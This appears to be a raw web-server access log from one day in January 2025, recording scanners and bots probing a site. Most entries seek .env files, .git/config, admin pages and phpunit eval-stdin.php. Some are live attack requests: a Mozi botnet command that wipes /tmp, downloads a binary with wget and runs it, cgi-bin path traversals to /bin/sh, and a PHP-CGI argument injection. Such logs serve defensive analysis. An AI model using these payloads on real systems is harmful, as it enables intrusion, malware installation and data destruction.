78.153.140.224 - - [15/Jan/2025:07:59:13 +0000] "GET /phpinformation.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4"
78.153.140.224 - - [15/Jan/2025:07:59:14 +0000] "GET /phpinformations.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5"
78.153.140.224 - - [15/Jan/2025:07:59:14 +0000] "GET /../.env HTTP/1.1" 400 485 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; HTC_H3000C Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.224 - - [15/Jan/2025:07:59:15 +0000] "GET /!.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SGH-T779 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
78.153.140.224 - - [15/Jan/2025:07:59:15 +0000] "GET /aws.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.576.0 Safari/534.12"
78.153.140.224 - - [15/Jan/2025:07:59:16 +0000] "GET /kyc/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MDDS; AskTbORJ/5.15.25.36191; BOIE9;ENUS)"
78.153.140.224 - - [15/Jan/2025:07:59:17 +0000] "GET /temp/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5"
78.153.140.224 - - [15/Jan/2025:07:59:18 +0000] "GET /logs/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36"
78.153.140.224 - - [15/Jan/2025:07:59:19 +0000] "GET /setup/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:PPC-i830; PPC; 240x320)"
78.153.140.224 - - [15/Jan/2025:07:59:19 +0000] "GET /httpd/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B202 Safari/604.1"
78.153.140.224 - - [15/Jan/2025:07:59:20 +0000] "GET /bin/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"
78.153.140.224 - - [15/Jan/2025:07:59:20 +0000] "GET /twilio/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.0; ; rv:1.8.0.10) Gecko/20070216 Firefox/1.9.0.1"
78.153.140.224 - - [15/Jan/2025:07:59:20 +0000] "GET /legal/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; x86_64 Linux; en_US; rv:1.8.16) Gecko/20071015 Firefox/2.0.0.8"
78.153.140.224 - - [15/Jan/2025:07:59:21 +0000] "GET /themes/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-D850/D85010f Build/KVT49L.D85010f) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36"
78.153.140.224 - - [15/Jan/2025:07:59:21 +0000] "GET /wwwroot/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24"
78.153.140.224 - - [15/Jan/2025:07:59:22 +0000] "GET /configs/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/604.5.6 (KHTML, like Gecko) Safari/604.5.6"
78.153.140.224 - - [15/Jan/2025:07:59:23 +0000] "GET /www-data/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
78.153.140.224 - - [15/Jan/2025:07:59:24 +0000] "GET /sql/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; zh-cn) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1"
31.220.1.144 - - [15/Jan/2025:08:02:31 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.181.190.248 - - [15/Jan/2025:08:11:39 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:08:11:39 +0000] "GET / HTTP/1.1" 200 1742 "http://34.87.62.22:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
46.19.138.234 - - [15/Jan/2025:08:16:58 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [15/Jan/2025:08:17:45 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:08:17:45 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
198.235.24.92 - - [15/Jan/2025:08:27:56 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
80.82.77.202 - - [15/Jan/2025:08:30:49 +0000] "\x16\x03\x02\x01o\x01" 400 531 "-" "-"
157.66.55.50 - - [15/Jan/2025:08:33:19 +0000] "GET /.git/config HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
157.66.55.50 - - [15/Jan/2025:08:33:20 +0000] "GET / HTTP/1.1" 200 889 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
179.43.191.146 - - [15/Jan/2025:08:53:05 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
34.168.171.29 - - [15/Jan/2025:09:11:40 +0000] "GET / HTTP/1.1" 200 1798 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.197 Safari/537.36"
66.249.64.109 - - [15/Jan/2025:09:23:11 +0000] "GET /robots.txt HTTP/1.1" 302 387 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.108 - - [15/Jan/2025:09:23:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.110 - - [15/Jan/2025:09:23:12 +0000] "GET /wp-content/uploads/2016/08/img__0003_128442-0012_2.jpg HTTP/1.1" 302 387 "-" "Googlebot-Image/1.0"
66.249.64.109 - - [15/Jan/2025:09:23:13 +0000] "GET / HTTP/1.1" 200 944 "-" "Googlebot-Image/1.0"
104.234.115.44 - - [15/Jan/2025:09:42:09 +0000] "" 400 531 "-" "-"
104.234.115.44 - - [15/Jan/2025:09:42:40 +0000] "\x16\x03\x01" 400 531 "-" "-"
104.234.115.44 - - [15/Jan/2025:09:43:31 +0000] "\x16\x03\x01" 400 531 "-" "-"
104.234.115.44 - - [15/Jan/2025:09:44:15 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.44 - - [15/Jan/2025:09:45:21 +0000] "\x16\x03\x01" 400 531 "-" "-"
104.234.115.44 - - [15/Jan/2025:09:46:37 +0000] "GET /manage/account/login HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.44 - - [15/Jan/2025:09:48:18 +0000] "\x16\x03\x01" 400 531 "-" "-"
104.234.115.44 - - [15/Jan/2025:09:49:31 +0000] "GET /admin/index.html HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
87.120.115.119 - - [15/Jan/2025:09:50:40 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3888.0 Safari/537.36"
104.234.115.44 - - [15/Jan/2025:09:51:03 +0000] "\x16\x03\x01" 400 531 "-" "-"
104.234.115.44 - - [15/Jan/2025:09:52:23 +0000] "GET /index.html HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.44 - - [15/Jan/2025:09:54:16 +0000] "\x16\x03\x01" 400 531 "-" "-"
104.234.115.44 - - [15/Jan/2025:09:55:42 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.44 - - [15/Jan/2025:09:57:25 +0000] "\x16\x03\x01" 400 531 "-" "-"
104.234.115.44 - - [15/Jan/2025:09:58:40 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.44 - - [15/Jan/2025:10:00:21 +0000] "\x16\x03\x01" 400 531 "-" "-"
104.234.115.44 - - [15/Jan/2025:10:01:36 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.44 - - [15/Jan/2025:10:04:34 +0000] "GET /login.jsp HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
78.153.140.149 - - [15/Jan/2025:10:05:20 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:10:05:20 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
104.234.115.44 - - [15/Jan/2025:10:06:13 +0000] "\x16\x03\x01" 400 531 "-" "-"
104.234.115.44 - - [15/Jan/2025:10:07:27 +0000] "GET /doc/index.html HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.44 - - [15/Jan/2025:10:09:12 +0000] "\x16\x03\x01" 400 531 "-" "-"
104.234.115.44 - - [15/Jan/2025:10:10:26 +0000] "GET /remote/login HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.44 - - [15/Jan/2025:10:12:25 +0000] "\x16\x03\x01" 400 531 "-" "-"
104.234.115.44 - - [15/Jan/2025:10:13:53 +0000] "GET / HTTP/1.1" 200 947 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
66.249.64.108 - - [15/Jan/2025:10:53:12 +0000] "GET /robots.txt HTTP/1.1" 302 387 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.108 - - [15/Jan/2025:10:53:12 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.108 - - [15/Jan/2025:10:53:12 +0000] "GET /wp-content/uploads/2016/08/img__0001_128442-0012_4.jpg HTTP/1.1" 302 386 "-" "Googlebot-Image/1.0"
66.249.64.110 - - [15/Jan/2025:10:53:13 +0000] "GET / HTTP/1.1" 200 945 "-" "Googlebot-Image/1.0"
5.181.190.248 - - [15/Jan/2025:10:58:03 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:10:58:04 +0000] "GET / HTTP/1.1" 200 1742 "http://34.87.62.22:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
78.153.140.149 - - [15/Jan/2025:11:25:28 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:11:25:28 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
178.185.184.101 - - [15/Jan/2025:11:34:10 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
4.151.230.193 - - [15/Jan/2025:11:49:28 +0000] "GET /actuator/health HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
47.91.91.123 - - [15/Jan/2025:13:08:54 +0000] "\x16\x03\x01" 400 531 "-" "-"
78.153.140.149 - - [15/Jan/2025:13:14:05 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:13:14:05 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
157.66.55.50 - - [15/Jan/2025:13:18:28 +0000] "GET /.git/config HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
157.66.55.50 - - [15/Jan/2025:13:18:33 +0000] "GET / HTTP/1.1" 200 889 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
139.59.101.104 - - [15/Jan/2025:13:18:49 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
105.112.234.136 - - [15/Jan/2025:13:19:30 +0000] "GET //.env HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
105.112.234.136 - - [15/Jan/2025:13:19:31 +0000] "GET / HTTP/1.1" 200 947 "http://34.87.62.22//.env" "Go-http-client/1.1"
64.23.201.216 - - [15/Jan/2025:13:31:08 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 302 350 "-" "xfa1"
78.153.140.149 - - [15/Jan/2025:13:37:57 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:13:37:57 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
66.249.64.110 - - [15/Jan/2025:13:53:12 +0000] "GET /robots.txt HTTP/1.1" 302 387 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.109 - - [15/Jan/2025:13:53:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.109 - - [15/Jan/2025:13:53:12 +0000] "GET /wp-content/uploads/2016/08/img__0001_032205-0080_3.jpg HTTP/1.1" 302 386 "-" "Googlebot-Image/1.0"
66.249.64.109 - - [15/Jan/2025:13:53:13 +0000] "GET / HTTP/1.1" 200 944 "-" "Googlebot-Image/1.0"
5.181.190.248 - - [15/Jan/2025:13:58:52 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:13:59:00 +0000] "GET / HTTP/1.1" 200 1742 "http://34.87.62.22:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
35.240.127.158 - - [15/Jan/2025:14:17:27 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
179.43.191.146 - - [15/Jan/2025:14:19:26 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
66.240.236.116 - - [15/Jan/2025:14:41:06 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
78.153.140.149 - - [15/Jan/2025:14:48:02 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:14:48:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
170.64.159.7 - - [15/Jan/2025:15:00:37 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
204.101.161.19 - - [15/Jan/2025:15:10:06 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
204.101.161.19 - - [15/Jan/2025:15:10:06 +0000] "GET /css/login.css HTTP/1.1" 200 644 "http://34.87.62.22/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
204.101.161.19 - - [15/Jan/2025:15:10:07 +0000] "GET /js/brand.js HTTP/1.1" 200 570 "http://34.87.62.22/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
204.101.161.19 - - [15/Jan/2025:15:10:07 +0000] "GET /js/login.js HTTP/1.1" 200 922 "http://34.87.62.22/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
204.101.161.19 - - [15/Jan/2025:15:10:44 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 1345 "http://34.87.62.22/js/login.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
204.101.161.19 - - [15/Jan/2025:15:10:52 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "-"
204.101.161.19 - - [15/Jan/2025:15:10:55 +0000] "GET /js/brand.js HTTP/1.1" 200 713 "-" "-"
204.101.161.19 - - [15/Jan/2025:15:10:57 +0000] "GET /js/login.js HTTP/1.1" 200 2036 "-" "-"
204.101.161.19 - - [15/Jan/2025:15:10:57 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 2746 "-" "-"
59.23.56.103 - - [15/Jan/2025:15:14:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
138.197.154.130 - - [15/Jan/2025:15:53:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
178.215.236.132 - - [15/Jan/2025:16:04:26 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36"
120.85.114.83 - - [15/Jan/2025:16:43:19 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 302 387 "-" "Hello, world"
3.144.116.195 - - [15/Jan/2025:16:47:29 +0000] "GET //.env HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
3.144.116.195 - - [15/Jan/2025:16:47:30 +0000] "GET / HTTP/1.1" 200 947 "http://34.87.62.22//.env" "Go-http-client/1.1"
66.249.64.109 - - [15/Jan/2025:16:53:11 +0000] "GET /robots.txt HTTP/1.1" 302 387 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.109 - - [15/Jan/2025:16:53:12 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.110 - - [15/Jan/2025:16:53:12 +0000] "GET /wp-content/uploads/2016/08/img__0002_030702-0245_2.jpg HTTP/1.1" 302 387 "-" "Googlebot-Image/1.0"
66.249.64.109 - - [15/Jan/2025:16:53:13 +0000] "GET / HTTP/1.1" 200 944 "-" "Googlebot-Image/1.0"
78.153.140.149 - - [15/Jan/2025:17:10:43 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:17:10:44 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
180.4.191.62 - - [15/Jan/2025:17:44:34 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
37.58.18.237 - - [15/Jan/2025:18:03:19 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 485 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:19 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 485 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:20 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:20 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:20 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:21 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:21 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:22 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:22 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:22 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:23 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:23 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:23 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:23 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:24 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:24 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:24 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:24 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:25 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:25 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
37.58.18.237 - - [15/Jan/2025:18:03:25 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
